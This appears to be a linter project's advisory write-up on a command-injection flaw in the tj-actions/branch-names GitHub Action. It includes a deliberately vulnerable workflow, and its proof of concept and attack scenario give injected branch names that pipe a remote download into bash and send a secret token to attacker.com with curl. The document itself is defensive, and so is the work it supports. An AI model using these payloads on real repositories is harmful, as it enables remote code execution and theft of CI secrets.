# GHSA-gq52-6phf-x2r6: Command Injection via eval printf in tj-actions/branch-names

## Summary

| Field | Value |
|-------|-------|
| **Advisory ID** | GHSA-gq52-6phf-x2r6 |
| **Package** | tj-actions/branch-names |
| **Severity** | Critical (CVSS 9.1) |
| **Vulnerability Type** | Command Injection (CWE-77) |
| **Affected Versions** | <= 8.2.1 |
| **Fixed Version** | 9.0.0 |
| **Published** | 2024-01-30 |
| **Advisory URL** | https://github.com/advisories/GHSA-gq52-6phf-x2r6 |

## Vulnerability Description

The `tj-actions/branch-names` action (versions <= 8.2.1) is vulnerable to command injection due to inconsistent input sanitization and unescaped output handling. While internal sanitization using `printf "%q"` properly escapes untrusted input, subsequent unescaping via `eval printf "%s"` reintroduces command injection risks.

**Technical Details:**
- CVSS Score: 9.1/10 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:L)
- CWE-77: Improper Neutralization of Special Elements used in a Command (Command Injection)
- EPSS: 0.075% (23rd percentile)
- Scope Change: Yes - impacts resources beyond the component's security scope

**Vulnerable Code Pattern:**
```bash
echo "base_ref_branch=$(eval printf "%s" "$BASE_REF")" >> "$GITHUB_OUTPUT"
echo "head_ref_branch=$(eval printf "%s" "$HEAD_REF")" >> "$GITHUB_OUTPUT"
echo "ref_branch=$(eval printf "%s" "$REF_BRANCH")" >> "$GITHUB_OUTPUT"
```

**Proof of Concept:**
Creating a branch named `$(curl,-sSfL,www.naturl.link/NNT652}${IFS}|${IFS}bash)` executes arbitrary code when a pull request is opened.

**Impact:**
- Theft of repository secrets
- Unauthorized write access with GITHUB_TOKEN permissions
- Compromise of repository integrity
- Potential for persistent backdoors

**The Fix (v9.0.0):**
The patch removes the use of `eval` entirely:
- Properly uses environment variables for all inputs
- Removes the unsafe `eval printf "%s"` pattern
- Ensures inputs are treated as literal string data throughout processing

### Attack Scenario

1. Attacker forks a public repository
2. Creates a branch with name: `main$(curl http://attacker.com/exfil?token=$SECRET)`
3. Opens a pull request to the target repository
4. The workflow triggers on `pull_request_target` with elevated privileges
5. The `eval printf` statement executes the attacker's command
6. Secrets or repository access can be exfiltrated

## Vulnerable Pattern

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  process-branch:
    runs-on: ubuntu-latest
    steps:
      - name: Get branch names
        id: branch-names
        run: |
          BASE_REF="${{ github.base_ref }}"
          HEAD_REF="${{ github.head_ref }}"

          # Vulnerable: eval printf with unsanitized input
          echo "base_ref_branch=$(eval printf "%s" "$BASE_REF")" >> "$GITHUB_OUTPUT"
          echo "head_ref_branch=$(eval printf "%s" "$HEAD_REF")" >> "$GITHUB_OUTPUT"
```

### Why This is Vulnerable

- **eval** executes arbitrary code in the shell
- Branch names from `github.base_ref`/`github.head_ref` are attacker-controlled
- The `pull_request_target` trigger provides write access and secrets
- No sanitization or validation of branch names before `eval`

## Safe Pattern

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  process-branch:
    runs-on: ubuntu-latest
    steps:
      - name: Get branch names
        id: branch-names
        env:
          BASE_REF: ${{ github.base_ref }}
          HEAD_REF: ${{ github.head_ref }}
        run: |
          # Safe: Use environment variables and printf without eval
          echo "base_ref_branch=$(printf "%s" "$BASE_REF")" >> "$GITHUB_OUTPUT"
          echo "head_ref_branch=$(printf "%s" "$HEAD_REF")" >> "$GITHUB_OUTPUT"
```

### Why This is Safe

- Environment variables prevent shell expansion during assignment
- `printf` without `eval` does not execute code
- Input is treated as literal string data
- Command injection is prevented

## Detection in sisakulint

### Expected Rules

- **CodeInjectionCriticalRule** - Should detect untrusted `github.base_ref`/`github.head_ref` in `eval` commands
- **OutputClobberingCriticalRule** - Should detect unsafe output clobbering patterns

### sisakulint Detection Result

```
script/actions/advisory/GHSA-gq52-6phf-x2r6-vulnerable.yaml:25:24: code injection (critical): "github.head_ref" is potentially untrusted and used in a workflow with privileged triggers. Avoid using it directly in inline scripts. Instead, pass it through an environment variable. See https://sisaku-security.github.io/lint/docs/rules/codeinjectioncritical/ [code-injection-critical]
```

### Analysis

| Detected | Rule | Category Match |
|----------|------|----------------|
| Yes | code-injection-critical | Yes |

sisakulint **successfully detects** this vulnerability through the `CodeInjectionCriticalRule`, which identifies that `github.head_ref` is being used directly in an inline script with a privileged trigger (`pull_request_target`). The rule correctly recommends passing the value through an environment variable to prevent command injection.

## Mitigation Strategies

1. **Use Environment Variables** (Recommended)
   - Always pass GitHub context values through environment variables
   - Prevents shell expansion and command injection

2. **Update to Fixed Version**
   - Upgrade to `tj-actions/branch-names@v9.0.0` or later
   - The fixed version eliminates the use of `eval`

3. **Avoid eval Entirely**
   - Never use `eval` with untrusted input
   - Use safer alternatives like `printf` without `eval`

4. **Input Validation**
   - Validate branch names match expected patterns
   - Use allowlists for acceptable characters

## References

- GitHub Advisory: https://github.com/advisories/GHSA-gq52-6phf-x2r6
- Repository Security Advisory: https://github.com/tj-actions/branch-names/security/advisories/GHSA-gq52-6phf-x2r6
- Security Patch Commit: https://github.com/tj-actions/branch-names/commit/e497ceb8ccd43fd9573cf2e375216625bc411d1f
- Release Notes: https://github.com/tj-actions/branch-names/releases/tag/v9.0.0
- Related Advisory (changed-files): https://github.com/tj-actions/changed-files/security/advisories/GHSA-mcph-m25j-8j63
- CVE: CVE-2025-54416
- CWE-77: Improper Neutralization of Special Elements used in a Command
- Related sisakulint rules:
  - [Code Injection Rule](../codeinjectionrule.md)
  - [Output Clobbering Rule](../outputclobbering.md)
